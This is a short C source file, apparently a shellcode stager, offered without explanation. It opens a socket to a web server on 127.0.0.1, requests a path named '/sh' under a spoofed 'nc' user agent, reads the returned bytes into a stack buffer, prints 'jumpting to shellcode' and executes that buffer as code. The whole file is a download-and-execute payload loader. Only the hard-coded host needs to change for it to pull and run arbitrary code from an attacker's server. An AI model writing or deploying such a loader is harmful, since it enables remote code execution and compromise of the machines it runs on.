#include <strings.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h> 
#include <fcntl.h>
#include <stdlib.h>

#define BSIZE 256
#define KSIZE 11


int main(int argc, char *argv[]) {
   int sockfd, portno, n;
   struct sockaddr_in serv_addr;
   struct hostent *server;
   char key[KSIZE];
   char request[] = "GET /sh HTTP/1.1\r\nUser-Agent: nc/0.0.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\n\r\n";
   char buffer[BSIZE];

   portno = 80;
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   server = gethostbyname("127.0.0.1");

   
   bzero((char *) &serv_addr, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
   serv_addr.sin_port = htons(portno);

   if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
      exit(1);
   }

   bzero(buffer,BSIZE);

   n = write(sockfd, request, strlen(request));

   bzero(buffer,BSIZE);
   n = read(sockfd, buffer, BSIZE);
   printf("jumpting to shellcode\n");
   int (*func)();
   func = (int (*)()) buffer;
   (int)(*func)();

   return 0;
}
